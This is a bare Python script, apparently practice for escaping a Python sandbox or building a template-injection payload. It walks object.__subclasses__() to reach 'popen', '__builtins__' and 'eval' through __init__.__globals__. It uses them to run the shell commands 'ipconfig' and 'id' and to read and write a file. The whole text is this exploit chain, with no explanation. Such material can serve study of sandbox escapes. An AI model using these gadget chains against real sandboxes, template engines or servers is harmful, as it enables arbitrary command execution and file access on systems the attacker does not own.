

for i in range(1,200):
    try:
        print('abc'.__class__.__base__.__subclasses__()[i].__init__.__globals__['popen'])
        print('abc'.__class__.__base__.__subclasses__()[i])
        print(i)
    except:
        pass

#print("os",[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os'))#[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
print('abc'.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('ipconfig').read())
print('abc'.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__['__builtins__']['open']('1.txt').read())
print('abc'.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__['__builtins__']['open']('1.txt',"w").write("hello"))


for c in [].__class__.__base__.__subclasses__():
    if c.__name__=='catch_warnings':
        print(c.__init__.__globals__.values())#.__globals__.values())
        for b in c.__init__.__globals__.values():
            print(b)
            if 'eval' in b.keys():
                b['eval']('__import__("os").popen("id").read()')